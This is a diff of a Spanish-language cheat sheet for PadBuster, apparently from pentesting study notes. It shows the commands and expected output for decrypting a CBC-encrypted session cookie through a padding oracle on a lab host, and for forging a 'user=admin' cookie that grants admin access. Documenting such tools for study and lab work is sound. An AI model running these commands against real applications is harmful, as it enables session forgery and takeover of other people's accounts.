@@ -1,20 +1,26 @@
 # PadBuster
 
-PadBuster es una herramienta para explotar vulnerabilidades de **Padding Oracle**. Permite descifrar cookies o tokens cifrados con CBC y, una vez conocido el texto plano, forjar nuevos valores cifrados (p.ej. cambiar `user=bendu` por `user=admin`).
+PadBuster es una herramienta de línea de comandos diseñada para explotar vulnerabilidades de **Padding Oracle**. Permite descifrar cookies o tokens cifrados con CBC y, una vez conocido el texto plano, forjar nuevos valores cifrados.
+
+Para entender el ataque que esta herramienta automatiza, ver: [Padding Oracle](./Padding_Oracle.md)
 
 ---
 
 ## Sintaxis
 
 ```bash
-padbuster <URL> <EncryptedSample> <BlockSize> [opciones]
+padbuster <URL> <ValorCifrado> <TamañoBloque> [opciones]
 ```
 
-El tamaño de bloque habitual es `8` (DES/3DES) o `16` (AES).
+| Parámetro | Descripción |
+|---|---|
+| `<URL>` | URL de la aplicación vulnerable |
+| `<ValorCifrado>` | El token/cookie cifrado a descifrar o forjar |
+| `<TamañoBloque>` | Tamaño del bloque en bytes: `8` para DES/3DES, `16` para AES |
 
 ---
 
-## Descifrar una cookie
+## Descifrar un valor cifrado
 
 ```bash
 padbuster http://192.168.1.17/index.php \
@@ -24,7 +30,6 @@ padbuster http://192.168.1.17/index.php \
 ```
 
 Salida esperada:
-
 ```
 [+] Decrypted value (ASCII): user=bendu
 [+] Decrypted value (HEX):   757365723D62656E6475060606060606
@@ -35,7 +40,7 @@ Salida esperada:
 
 ## Forjar un nuevo valor cifrado
 
-Una vez conocido el formato del texto plano, se puede cifrar un valor arbitrario:
+Una vez conocido el formato del texto plano, se puede cifrar cualquier valor arbitrario:
 
 ```bash
 padbuster http://192.168.1.17/index.php \
@@ -45,10 +50,21 @@ padbuster http://192.168.1.17/index.php \
   -plaintext 'user=admin'
 ```
 
-PadBuster devuelve una cookie cifrada con el valor `user=admin` que el servidor aceptará como válida.
+Salida:
+```
+[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
+```
+
+Colocar este valor como cookie de sesión en el navegador otorgará acceso a la cuenta `admin` si existe.
 
 ---
 
-## Ver también
+## Opciones útiles
 
-- [Padding Oracle Attack](../03-explotacion-web/padding-oracle.md) — Explicación teórica y explotación manual
+| Opción | Descripción |
+|---|---|
+| `-cookies` | Envía la cookie cifrada con cada petición |
+| `-plaintext` | Texto plano a cifrar (modo forja) |
+| `-encoding` | Encoding del valor cifrado: `0`=Base64, `1`=HEX, `2`=Net, `3`=Base64+, `4`=URI |
+| `-error` | Cadena que aparece en respuesta con padding inválido |
+| `-noiv` | Indica que no hay IV prepended al valor cifrado |
